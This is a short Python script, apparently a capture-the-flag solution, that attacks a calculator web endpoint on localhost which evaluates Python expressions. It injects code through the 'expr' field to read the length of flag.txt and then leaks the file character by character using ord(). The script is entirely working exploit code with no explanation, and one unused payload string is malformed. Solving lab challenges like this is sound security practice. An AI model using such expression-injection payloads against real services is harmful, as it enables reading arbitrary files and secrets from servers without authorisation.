from requests import post
from json import loads


url = 'http://localhost:8080/calc'
headers = {"Content-Type": "application/json"}
extract_len = '{"expr":"len(open(\'./flag.txt\').read())"}'
extract_char = '{"expr":"open(\'./flag.txt\').read()[]"}'


doclen = int(loads(post(url, headers=headers, data='{"expr":"len(open(\'./flag.txt\').read())"}').text)['result'])

for i in range(doclen):
    print(chr(int(loads(post(url, headers=headers, data=f'{{"expr":"ord(open(\'./flag.txt\').read()[{i}])"}}').text)['result'])), end="")

print()
